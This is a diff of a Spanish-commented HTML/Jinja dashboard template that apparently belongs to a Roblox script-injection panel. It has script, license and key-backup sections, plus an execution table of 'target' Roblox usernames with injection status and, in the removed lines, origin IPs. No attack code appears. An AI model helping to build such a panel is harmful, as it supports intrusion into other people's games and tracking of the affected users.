@@ -351,7 +351,8 @@
                 <a href="#">📜 <span>Scripts</span></a>
                 <a href="#">🔑 <span>Licenses</span></a>
                 <a href="#">📂 <span>Files</span></a>
-                <a href="#">📊 <span>Analytics</span></a>
+                <!-- El enlace que usarás para tu página separada -->
+                <a href="/analytics">📊 <span>Analytics</span></a>
                 <a href="#">⚙ <span>Settings</span></a>
             </nav>
         </div>
@@ -414,12 +415,12 @@
                         <a href="/dashboard/exportar" class="btn-submit" style="display: block; text-align: center; text-decoration: none;">Download JSON</a>
                     </div>
                     
+                    <!-- Formulario de Autoload (Modificado a un solo clic) -->
                     <div class="form-container">
-                        <h4>📥 Restore Database Backup</h4>
-                        <p style="color: #777; font-size: 0.8rem; margin-bottom: 15px; line-height: 1.4;">Sube un archivo de respaldo JSON generado previamente para reinyectar todas las llaves a la base de datos de manera automática.</p>
-                        <form action="/dashboard/importar" method="POST" enctype="multipart/form-data" style="display: flex; gap: 10px;">
-                            <input type="file" name="file_respaldo" accept=".json" required class="form-control" style="flex: 1; padding: 7px;">
-                            <button type="submit" class="btn-submit" style="width: auto; padding: 0 15px;">Upload</button>
+                        <h4>🔄 Auto-Restore Database</h4>
+                        <p style="color: #777; font-size: 0.8rem; margin-bottom: 15px; line-height: 1.4;">Restaura automáticamente el último respaldo JSON guardado en el servidor sin necesidad de buscar o subir archivos manuales.</p>
+                        <form action="/dashboard/autoload" method="POST">
+                            <button type="submit" class="btn-submit">Auto-Load Backup</button>
                         </form>
                     </div>
                 </div>
@@ -512,45 +513,7 @@
                     </div>
                 </div>
 
-                <div class="summary-section">
-                    <div class="section-header">
-                        <h3>Live Execution Summary</h3>
-                        <span class="badge badge-blue">Resumen Global</span>
-                    </div>
-                    <div class="table-container">
-                        <table class="modern-table">
-                            <thead>
-                                <tr>
-                                    <th>Usuario Target</th>
-                                    <th>Ubicación</th>
-                                    <th>Dispositivo</th>
-                                    <th>Estado Inyección</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                {% for exe in ejecuciones %}
-                                <tr>
-                                    <td style="color: #fff; font-weight: 500;">{{ exe.roblox_username }}</td>
-                                    <td class="text-dim">Global / Proxy</td>
-                                    <td class="text-dim">Resumido</td>
-                                    <td>
-                                        {% if exe.universe_id == "0000000000" or not exe.universe_id %}
-                                            <span class="status-failed">FALLO</span>
-                                        {% else %}
-                                            <span class="status-success">ONLINE</span>
-                                        {% endif %}
-                                    </td>
-                                </tr>
-                                {% else %}
-                                <tr>
-                                    <td colspan="4" style="text-align: center; color: #555; padding: 30px;">Awaiting incoming connections...</td>
-                                </tr>
-                                {% endfor %}
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
-
+                <!-- SECCIÓN VERDE ACTUALIZADA: Telemetría unificada con tabla simple -->
                 <div class="summary-section">
                     <div class="section-header" style="flex-direction: column; align-items: flex-start; border-bottom: none; gap: 15px;">
                         <div class="header-top">
@@ -589,19 +552,26 @@
                         <table class="modern-table">
                             <thead>
                                 <tr>
-                                    <th>Target User</th>
-                                    <th>Universe ID</th>
-                                    <th>Origin IP</th>
-                                    <th>Timestamp</th>
+                                    <th>Usuario Target</th>
+                                    <th>Ubicación</th>
+                                    <th>Dispositivo</th>
+                                    <th>Estado Inyección</th>
                                 </tr>
                             </thead>
                             <tbody>
                                 {% for exe in ejecuciones %}
+                                <!-- data-timestamp permite que los botones de tiempo funcionen con esta tabla -->
                                 <tr data-timestamp="{{ exe.timestamp.isoformat() }}">
                                     <td style="color: #fff; font-weight: 500;">{{ exe.roblox_username }}</td>
-                                    <td class="mono-text" style="color: #aaa;">{{ exe.universe_id }}</td>
-                                    <td class="text-dim">{{ exe.ip_address }}</td>
-                                    <td class="text-dim">{{ exe.timestamp.strftime('%Y-%m-%d %H:%M') }}</td>
+                                    <td class="text-dim">Global / Proxy</td>
+                                    <td class="text-dim">Resumido</td>
+                                    <td>
+                                        {% if exe.universe_id == "0000000000" or not exe.universe_id %}
+                                            <span class="status-failed">FALLO</span>
+                                        {% else %}
+                                            <span class="status-success">ONLINE</span>
+                                        {% endif %}
+                                    </td>
                                 </tr>
                                 {% else %}
                                 <tr>
